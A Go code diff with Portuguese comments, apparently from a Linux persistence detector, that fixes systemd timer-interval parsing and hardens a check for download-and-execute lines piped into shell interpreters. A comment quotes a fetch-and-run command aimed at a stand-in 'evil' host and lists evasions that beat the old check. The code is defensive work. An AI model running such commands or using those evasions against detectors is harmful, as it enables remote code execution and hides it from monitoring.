@@ -284,20 +284,40 @@ func calendarInterval(cal string) (int, string, bool) {
 	case "hourly":
 		return 3600, cal, true
 	}
-	// o campo de tempo é o último; hh:mm[:ss]
+	// o campo de tempo é o último; hh[:mm[:ss]]
 	hhmm := fields[len(fields)-1]
 	parts := strings.Split(hhmm, ":")
-	// unidade de cada posição, do fim para o começo: seg, min, hora
+	if len(parts) > 3 {
+		return 0, "", false
+	}
+	// A unidade sai da POSIÇÃO ABSOLUTA no formato hh:mm:ss, não da distância
+	// até o fim da string. Indexar pela distância assumia que o último
+	// componente é sempre SEGUNDO, o que só vale na forma completa:
+	// `OnCalendar=*:*/30` (forma abreviada e válida, "a cada 30 minutos") era
+	// lido como 30 SEGUNDOS e virava persist.timer_frequent num timer de meia
+	// em meia hora, enquanto `*/6:00` (a cada 6 h) virava 360 s.
+	//
+	//	3 componentes → hh:mm:ss, o último é segundo
+	//	2 componentes → hh:mm,    o último é minuto
+	//	1 componente  → hh,       o último é hora
 	unit := []int{1, 60, 3600}
+	desloc := 3 - len(parts)
 	for i := len(parts) - 1; i >= 0; i-- {
-		u := 1
-		if k := len(parts) - 1 - i; k < len(unit) {
-			u = unit[k]
+		k := (len(parts) - 1 - i) + desloc
+		if k >= len(unit) {
+			continue
 		}
-		if n, ok := strings.CutPrefix(parts[i], "*/"); ok {
-			if v, err := strconv.Atoi(n); err == nil && v > 0 {
-				return v * u, cal, true
-			}
+		u := unit[k]
+		// O repetidor tem DUAS grafias no systemd: `*/M` e `N/M` (com base
+		// inicial). `*:0/5` é a forma mais comum de "a cada 5 minutos" e não
+		// tem o prefixo `*/` — ela devolvia false, e o beacon real não era
+		// detectado.
+		_, n, temBarra := strings.Cut(parts[i], "/")
+		if !temBarra {
+			continue
+		}
+		if v, err := strconv.Atoi(n); err == nil && v > 0 {
+			return v * u, cal, true
 		}
 	}
 	return 0, "", false
@@ -369,13 +389,45 @@ func pareceCaminho(s string) bool {
 	return !strings.ContainsAny(s, "*?[]()|;&$\"'`<>")
 }
 
+// interpretadoresDePipe é o conjunto que, do lado direito de um pipe, torna a
+// linha um baixa-e-executa.
+var interpretadoresDePipe = map[string]bool{
+	"sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true,
+	"ash": true, "busybox": true, "fish": true,
+	"python": true, "python2": true, "python3": true,
+	"perl": true, "ruby": true, "php": true, "node": true, "lua": true,
+}
+
+// pipesToShell diz se a linha canaliza para um interpretador.
+//
+// A comparação é pelo BASENAME do primeiro token depois do pipe, e não por
+// prefixo literal. Casar "|sh" e "| sh" deixava passar a forma mais óbvia que
+// existe — `curl -s http://evil/i | /bin/sh` —, porque ali o que segue o pipe é
+// " /bin/sh". Tab no lugar do espaço tinha o mesmo efeito, e `|sudo bash`
+// também. Como execSuspect é o classificador ÚNICO, cada evasão dessas zerava
+// junto persist.cron_suspect, trigger_exec, shell_startup e modprobe.
 func pipesToShell(low string) bool {
-	if !strings.Contains(low, "|") {
-		return false
-	}
-	for _, sh := range []string{"sh", "bash", "zsh", "dash", "python", "perl", "ruby"} {
-		if strings.Contains(low, "|"+sh) || strings.Contains(low, "| "+sh) {
-			return true
+	for i := 0; i < len(low); i++ {
+		if low[i] != '|' {
+			continue
+		}
+		// "||" é operador lógico, não pipe de dados.
+		if i+1 < len(low) && low[i+1] == '|' {
+			i++
+			continue
+		}
+		resto := strings.TrimLeft(low[i+1:], " \t")
+		for _, tok := range strings.Fields(resto) {
+			// A linha vem de dentro de aspas com frequência
+			// (`sh -c "… | bash"`), e o token carrega a pontuação do shell.
+			tok = strings.Trim(tok, "\"'`();&{}")
+			// sudo/env/nohup e afins prefixam o comando de verdade.
+			if b := baseDe(tok); interpretadoresDePipe[b] {
+				return true
+			} else if b != "sudo" && b != "env" && b != "nohup" && b != "setsid" &&
+				b != "doas" && b != "exec" {
+				break
+			}
 		}
 	}
 	return false
